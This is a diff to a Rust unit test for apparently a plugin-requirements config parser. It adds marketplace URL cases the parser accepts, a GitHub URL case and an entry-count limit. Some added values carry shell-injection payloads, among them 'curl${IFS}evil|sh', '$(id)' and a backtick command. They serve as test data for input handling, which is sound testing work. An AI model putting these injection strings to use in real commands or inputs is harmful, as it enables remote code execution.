@@ -373,6 +373,14 @@ fn required_plugins_are_checked() {
         ("ok", "a"),
         ("ok", "http://x/y"),
         ("ok", "https://x/ y"),
+        ("ok", "https://x/y;curl${IFS}evil|sh"),
+        ("ok", "https://x/y;z"),
+        ("ok", "https://x/$(id)"),
+        ("ok", "https://x/`id`"),
+        ("ok", "https://x/y|z"),
+        ("ok", "https://x/y&z"),
+        ("ok", "https://x/y?z"),
+        ("ok", "https://x/y#z"),
     ] {
         let toml = format!(
             "{head}[[requires.claude_plugins]]\nname = {name:?}\nmarketplace = {market:?}\n"
@@ -383,6 +391,9 @@ fn required_plugins_are_checked() {
             "{name} {market}"
         );
     }
+    let git = "[[requires.claude_plugins]]\nname = \"p\"\n\
+               marketplace = \"https://github.com/waycarbon/claude-code.git\"\n";
+    assert!(parse(&format!("{head}{git}")).is_ok());
     let entry = "[[requires.claude_plugins]]\nname = \"p\"\nmarketplace = \"a/b\"\n";
     assert!(parse(&format!("{head}{}", entry.repeat(5))).is_ok());
     assert!(parse(&format!("{head}{}", entry.repeat(6))).is_err());
